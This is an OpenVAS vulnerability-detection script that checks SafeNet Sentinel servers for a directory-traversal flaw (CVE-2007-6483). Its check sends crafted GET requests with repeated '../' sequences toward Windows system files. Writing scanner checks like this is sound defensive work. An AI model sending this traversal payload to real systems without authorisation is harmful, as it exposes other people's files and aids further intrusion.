###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_SafeNet_Sentinel_lfi_05_14.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# SafeNet Sentinel Protection Server and Sentinel Keys Server Directory Traversal
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Exploiting this issue will allow an attacker to view arbitrary files
within the context of the web server. Information harvested may aid in
launching further attacks.";

tag_affected = "SafeNet Sentinel Protection Server 7.0.0 through 7.4.0 and Sentinel Keys
Server 1.0.3 and 1.0.4";

tag_summary = "SafeNet Sentinel Protection Server and Sentinel Keys Server are prone
to a directory-traversal vulnerability because they fail to sufficiently sanitize 
user-supplied input.";

tag_solution = "Ask the vendor for an update.";
tag_vuldetect = "Send a special crafted HTTP GET request and check the response";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105028");
 script_cve_id("CVE-2007-6483");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
 script_version ("$Revision: 7577 $");

 script_name("SafeNet Sentinel Protection Server and Sentinel Keys Server Directory Traversal");


 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/33428/");
 
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2014-05-20 12:17:04 +0200 (Tue, 20 May 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 7002);
 script_mandatory_keys("SentinelKeysServer/banner");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:7002 );

banner = get_http_banner( port:port );
if( "Server: Sentinel" >!< banner ) exit( 0 );

files = traversal_files( 'windows' );

foreach file( keys( files ) )
{
  url = '/' + crap( data:"../", length:6*9 ) + files[file];
  if( http_vuln_check( port:port, url:url, pattern:file ) )
  {
    security_message( port:port );
    exit( 0 );
  }  
}  

exit( 99 );
